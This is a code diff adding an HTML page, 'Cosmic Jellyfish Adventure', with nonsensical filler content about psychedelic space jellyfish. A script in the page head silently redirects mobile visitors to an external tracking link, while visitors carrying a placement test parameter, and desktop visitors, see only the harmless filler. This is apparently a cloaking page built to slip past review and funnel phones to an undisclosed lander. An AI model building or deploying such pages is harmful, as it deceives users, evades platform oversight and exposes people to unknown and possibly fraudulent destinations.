@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Adventure</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF00FF, #00FFFF);
+            color: #FFFFFF;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #8A2BE2;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-direction: column-reverse;
+            align-items: center;
+            padding: 50px;
+        }
+        .content-box {
+            background-color: rgba(255, 105, 180, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 20px;
+            max-width: 600px;
+            transform: skew(-5deg);
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 3px 3px #FF1493;
+        }
+        footer {
+            background-color: #4B0082;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #FFFF00;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Jellyfish Adventure</h1>
+    </header>
+    <main>
+        <div class="content-box">
+            <h2>Welcome to the Neon Abyss</h2>
+            <p>Dive into a world where jellyfish rule the cosmos and rainbows are the primary form of transportation!</p>
+        </div>
+        <div class="content-box">
+            <h2>Psychedelic Sea Creatures</h2>
+            <p>Explore the vibrant ecosystem of space-dwelling aquatic life forms that defy the laws of physics and common sense!</p>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
